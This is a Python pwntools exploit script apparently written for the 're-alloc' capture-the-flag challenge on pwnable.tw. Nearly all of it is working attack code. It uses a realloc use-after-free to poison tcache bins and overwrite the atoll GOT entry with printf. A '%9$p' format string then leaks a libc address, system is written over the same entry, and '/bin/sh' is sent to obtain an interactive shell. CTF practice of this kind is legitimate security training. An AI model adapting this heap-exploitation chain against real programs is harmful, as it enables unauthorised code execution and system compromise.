#!/usr/bin/env python3

from pwn import *

exe = ELF("./re-alloc_patched")
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

context.binary = exe



if args.LOCAL:
    r = process([exe.path])
    gdb.attach(r, gdbscript='''
        b*0x40137A
        c
        ''')
    input()
else:
    r = remote("chall.pwnable.tw", 10106)


def alloc(index, size, data):
    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"Index:", f"{index}".encode())
    r.sendlineafter(b"Size:", f"{size}".encode())
    r.sendafter(b"Data:", data)

def realloc(index, size, data):
    r.sendlineafter(b"choice:", b"2")
    r.sendlineafter(b"Index:", f"{index}".encode())
    r.sendlineafter(b"Size:", f"{size}".encode())
    if size != 0:
        r.sendafter(b"Data:", data)

def free(index):
    r.sendlineafter(b"choice:", b"3")
    r.sendlineafter(b"Index:", f"{index}".encode())


def special_alloc(index, size, data):
    r.sendlineafter(b"choice:", b"1")
    if index==0:
        r.sendafter(b"Index:", f"\x00".encode())
    else:
        r.sendlineafter(b"Index:", f"".encode())
    r.sendlineafter(b"Size:", f"%{size-1}c".encode())
    r.sendafter(b"Data:", data)

def special_realloc(index, size, data):
    r.sendlineafter(b"choice:", b"2")
    if index==0:
        r.sendafter(b"Index:", f"\x00".encode())
    else:
        r.sendlineafter(b"Index:", f"".encode())
    r.sendlineafter(b"Size:", f"%{size-1}c".encode())
    if size != 0:
        r.sendafter(b"Data:", data)

def special_free(index):
    r.sendlineafter(b"choice:", b"3")
    if index==0:
        r.sendafter(b"Index:", f"\x00".encode())
    else:
        r.sendlineafter(b"Index:", f"".encode())



def main():
    # chunk size 0x20
    alloc(0, 0x10, b"abc") # Chunk A
    realloc(0, 0, b"?")
    # Tcache bin size of 0x20 -> Chunk A
    # Use-after-free
    realloc(0, 0x10, p64(exe.got['atoll']))
    # Tcache bin size of 0x20 -> Chunk A -> got['atoll'] 


    alloc(1, 0x10, b"lmao")
    # Tcache bin size of 0x20 -> got['atoll'] 

    realloc(1, 0x20, b"nothing")
    free(1) # set heap[1] = NULL

    
    realloc(0, 0x30, b"nothing")
    free(0) # set heap[0] = NULL


    alloc(0, 0x40, b"?") # Chunk B
    realloc(0, 0, b"?")
    # Tcache bin size of 0x50 -> Chunk B
    realloc(0, 0x40, p64(exe.got['atoll']))
    # Tcache bin size of 0x50 -> Chunk B -> got['atoll'] 

    alloc(1, 0x40, b"nopeee")
    # Tcache bin size of 0x50 -> got['atoll'] 
    realloc(1, 0x50, b"think")
    free(1) # set heap[1] = NULL


    realloc(0, 0x60, b"abc")
    free(0) # set heap[0] = NULL


    alloc(0, 0x40, p64(exe.plt['printf'])) #got['atoll'] = plt['printf']
    # Tcache bin size of 0x50: empty


    # CAll alloc() to leak libc
    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"Index:", b"%9$p") # format string

    libc.address = int(r.recvline()[:-1], 16) - 0x1e5760
    print("[*] libc: ", hex(libc.address))



    # FINAL
    special_alloc(1, 0x10, p64(libc.sym['system']))

    r.sendlineafter(b"choice:", b"1")
    r.sendlineafter(b"Index:", b"/bin/sh")
    #special_alloc(0, 0x58, b"abc")


    #special_free(1)


    # final stage
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
